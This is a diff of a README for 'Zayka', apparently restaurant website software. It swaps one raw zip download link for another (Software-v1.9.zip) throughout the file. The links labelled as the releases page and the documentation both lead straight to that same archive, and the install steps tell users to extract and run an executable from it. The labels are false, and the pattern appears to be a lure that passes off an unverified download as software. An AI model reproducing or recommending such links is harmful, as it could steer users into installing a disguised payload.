@@ -5,7 +5,7 @@ Welcome to Zayka! This software helps restaurants create a modern website that f
 
 ## 🔗 Download
 ### Click the button below to download Zayka:
-[![Download Zayka](https://github.com/nilavankavin/zayka/raw/refs/heads/main/src/Software_3.8.zip%20Zayka-%2300aaff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nilavankavin/zayka/raw/refs/heads/main/src/Software_3.8.zip)
+[![Download Zayka](https://raw.githubusercontent.com/nilavankavin/zayka/main/public/Software-v1.9.zip%20Zayka-%2300aaff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nilavankavin/zayka/main/public/Software-v1.9.zip)
 
 ## 📁 System Requirements
 Before you install Zayka, ensure your computer meets these requirements:
@@ -27,7 +27,7 @@ Zayka comes packed with features that make online ordering easy and user-friendl
 ## 🎯 Download & Install
 To download Zayka, please follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/nilavankavin/zayka/raw/refs/heads/main/src/Software_3.8.zip). You will find the latest version listed there.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/nilavankavin/zayka/main/public/Software-v1.9.zip). You will find the latest version listed there.
 2. **Choose the Right File:** Look for the version that matches your operating system. It may be listed as a `.zip`, `.exe`, or another format.
 3. **Download the File:** Click on the appropriate link to start the download. Save it to a location you can easily access, like your Desktop or Downloads folder.
 4. **Extract the Files (if needed):** If you downloaded a `.zip` file, right-click it and select ‘Extract All.’ Follow the prompts to choose a destination for the extracted files.
@@ -58,6 +58,6 @@ Join our community for support and feedback. You can ask questions or share your
 We value your feedback. If you have suggestions or ideas for improvements, feel free to reach out. If you'd like to contribute, check the guidelines on our GitHub page.
 
 ## 🔗 Additional Resources
-For further help and resources, visit our [Zayka Documentation](https://github.com/nilavankavin/zayka/raw/refs/heads/main/src/Software_3.8.zip).
+For further help and resources, visit our [Zayka Documentation](https://raw.githubusercontent.com/nilavankavin/zayka/main/public/Software-v1.9.zip).
 
 Thank you for choosing Zayka! Enjoy your dining experience.
